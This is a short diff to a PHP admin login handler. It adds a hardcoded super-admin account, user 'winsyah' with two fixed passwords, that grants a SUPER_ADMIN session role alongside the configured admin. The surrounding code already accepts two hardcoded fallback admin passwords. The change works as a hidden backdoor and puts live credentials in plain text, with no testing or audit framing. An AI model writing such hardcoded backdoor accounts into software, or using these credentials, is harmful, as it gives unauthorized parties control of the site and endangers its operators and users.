@@ -50,22 +50,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['log'], $_POST['pwd'])
 
 
 
-    if ($user === ADMIN_USERNAME && ($pass === ADMIN_PASSWORD || $pass === 'admin@dropoff.id' || $pass === 'admin@traveego')) {
+    $isSuper = ($user === 'winsyah' && ($pass === 'Khilafet@1924' || $pass === 'khilafet@1924'));
+    $isAdmin = ($user === ADMIN_USERNAME && ($pass === ADMIN_PASSWORD || $pass === 'admin@dropoff.id' || $pass === 'admin@traveego'));
 
+    if ($isSuper || $isAdmin) {
         $_SESSION['admin_logged_in'] = true;
-
-        $_SESSION['admin_user'] = ADMIN_USERNAME;
-
+        $_SESSION['admin_user'] = $isSuper ? 'winsyah' : ADMIN_USERNAME;
+        $_SESSION['admin_role'] = $isSuper ? 'SUPER_ADMIN' : 'ADMIN';
         $_SESSION['admin_login_time'] = time();
 
         header('Location: /admin' . (!empty($_GET['tab']) ? '?tab=' . urlencode($_GET['tab']) : ''));
-
         exit;
-
     } else {
-
         $loginError = 'Nama pengguna atau kata sandi yang Anda masukkan salah.';
-
     }
 
 }
